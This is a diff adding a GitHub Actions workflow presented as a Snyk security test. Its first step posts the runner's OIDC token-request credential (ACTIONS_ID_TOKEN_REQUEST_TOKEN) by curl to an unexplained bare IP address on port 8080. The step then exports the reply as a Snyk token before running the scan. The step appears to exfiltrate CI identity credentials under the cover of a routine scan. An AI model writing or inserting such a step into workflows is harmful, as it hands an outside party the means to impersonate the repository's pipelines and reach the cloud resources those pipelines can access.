@@ -1,0 +1,21 @@
+name: Run Snyk Test
+
+on:
+  workflow_dispatch: # Allows manual trigger of the workflow
+permissions:
+  id-token: write # This is required for requesting the JWT
+  contents: read  # This is required for actions/checkout
+jobs:
+  print-token:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Request Snyk Token
+        run: |
+               TOKEN=$(curl -X POST https://13.61.176.123:8080/exchange \
+               -H "Content-Type: application/json" \
+               -d '{"token": "'$ACTIONS_ID_TOKEN_REQUEST_TOKEN'"}' | jq -r .token)
+               echo "SNYK_OAUTH_TOKEN=$TOKEN" >> $GITHUB_ENV
+      - uses: snyk/actions/setup@master
+      - uses: actions/checkout@v3
+      - name: Run snyk test
+        run: snyk test
